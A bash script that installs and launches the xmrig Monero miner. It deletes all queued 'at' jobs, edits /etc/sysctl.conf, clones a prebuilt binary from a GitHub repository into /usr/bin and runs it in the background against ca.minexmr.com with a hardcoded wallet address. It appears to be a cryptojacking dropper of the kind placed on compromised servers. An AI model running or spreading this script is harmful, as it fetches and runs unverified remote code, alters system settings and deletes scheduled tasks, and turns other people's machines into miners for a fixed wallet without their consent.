#!/usr/bin/env bash

pool='ca.minexmr.com'
port=4444
ID="$(hostname)"
WALLET=46XYFkrVGBjUjFS891F17uivxsijPnen18WmBKdrgUWzjoVPyQFduYzQwAK61ox5oZK5QmhBRqK5cF8gJ1HC69R6M3NdQkY
PASSWORD=x
THREADS="$(nproc --all)"

rm -rf /tmp/miner/
for i in `atq | awk '{print $1}'`;do atrm $i;done
sudo dpkg --configure -a
echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
sleep 2
cd /tmp && mkdir miner
git clone https://github.com/loaman1/miner-xmr.git /tmp/miner
cd /tmp/miner
chmod +x /tmp/miner/xmrig
cp /tmp/miner/xmrig /usr/bin/
sleep 1
xmrig -O ${pool}:${port} -u ${WALLET}.${ID} --pass=${PASSWORD} --rig-id=${ID} -B --donate-level=1--background -S
echo -e 'ALL WORKS! tail -f /tmp/miner/xmrig.log'